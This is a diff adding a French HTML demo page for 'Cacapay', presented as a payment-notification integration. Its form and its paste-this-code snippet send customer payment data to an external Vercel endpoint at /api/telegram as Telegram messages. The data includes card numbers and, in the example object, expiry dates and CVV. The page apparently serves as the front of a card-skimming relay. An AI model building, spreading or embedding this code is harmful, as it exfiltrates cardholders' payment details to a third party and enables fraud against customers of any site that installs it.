@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exemple d'utilisation Cacapay</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .code-example {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Exemple d'utilisation Cacapay</h1>
+        <p>Ce formulaire montre comment intégrer les notifications Cacapay dans votre site.</p>
+        
+        <h2>📝 Formulaire de test</h2>
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="customerName">Nom du client *</label>
+                <input type="text" id="customerName" value="Jean Dupont" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="email">Email *</label>
+                <input type="email" id="email" value="jean@example.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="product">Produit</label>
+                <select id="product">
+                    <option value="Produit Premium">Produit Premium</option>
+                    <option value="Produit Standard">Produit Standard</option>
+                    <option value="Produit Basic">Produit Basic</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="amount">Montant (€) *</label>
+                <input type="number" id="amount" value="99.99" step="0.01" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="cardNumber">Numéro de carte</label>
+                <input type="text" id="cardNumber" value="1234 5678 9012 3456">
+            </div>
+            
+            <button type="submit">💳 Tester la notification</button>
+        </form>
+        
+        <div id="result"></div>
+        
+        <h2>💻 Code d'intégration</h2>
+        <p>Voici le code à ajouter dans votre site :</p>
+        
+        <div class="code-example">// 1. Inclure le fichier integration.js
+&lt;script src="integration.js"&gt;&lt;/script&gt;
+
+// 2. Utiliser la fonction dans votre code
+async function processPayment(paymentData) {
+    // Traiter le paiement
+    const paymentResult = await processPaymentWithStripe(paymentData);
+    
+    if (paymentResult.success) {
+        // Envoyer la notification Cacapay
+        const notificationResult = await sendCacapayNotification(paymentData);
+        
+        if (notificationResult.success) {
+            console.log('✅ Notification envoyée !', notificationResult.messageId);
+            // Rediriger vers la page de succès
+            window.location.href = '/success';
+        } else {
+            console.error('❌ Erreur notification:', notificationResult.error);
+        }
+    }
+}
+
+// 3. Exemple de données de paiement
+const paymentData = {
+    customerName: 'Jean Dupont',
+    email: 'jean@example.com',
+    product: 'Produit Premium',
+    amount: 99.99,
+    cardNumber: '1234 **** **** 5678',
+    expiry: '12/25',
+    cvv: '123'
+};
+
+// 4. Envoyer la notification
+sendCacapayNotification(paymentData);</div>
+        
+        <h2>🔧 Configuration</h2>
+        <p>L'API Cacapay est configurée pour :</p>
+        <ul>
+            <li><strong>URL :</strong> <code>https://test-alpha-lac-68.vercel.app/api/telegram</code></li>
+            <li><strong>Timeout :</strong> 10 secondes</li>
+            <li><strong>Retry :</strong> 3 tentatives avec backoff exponentiel</li>
+            <li><strong>Format :</strong> Message Telegram formaté</li>
+        </ul>
+    </div>
+
+    <!-- Inclure le fichier d'intégration -->
+    <script src="integration.js"></script>
+    
+    <script>
+        // Gestion du formulaire
+        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const paymentData = {
+                customerName: document.getElementById('customerName').value,
+                email: document.getElementById('email').value,
+                product: document.getElementById('product').value,
+                amount: parseFloat(document.getElementById('amount').value),
+                cardNumber: document.getElementById('cardNumber').value
+            };
+            
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = '<p>⏳ Envoi de la notification...</p>';
+            
+            try {
+                const result = await sendCacapayNotification(paymentData);
+                
+                if (result.success) {
+                    resultDiv.innerHTML = `
+                        <div class="result success">
+                            <h3>✅ Notification envoyée avec succès !</h3>
+                            <p><strong>Message ID :</strong> ${result.messageId}</p>
+                            <p><strong>Timestamp :</strong> ${result.timestamp}</p>
+                            <p>📱 Vérifiez votre Telegram !</p>
+                        </div>
+                    `;
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="result error">
+                            <h3>❌ Erreur lors de l'envoi</h3>
+                            <p>${result.error}</p>
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="result error">
+                        <h3>❌ Erreur</h3>
+                        <p>${error.message}</p>
+                    </div>
+                `;
+            }
+        });
+    </script>
+</body>
+</html>
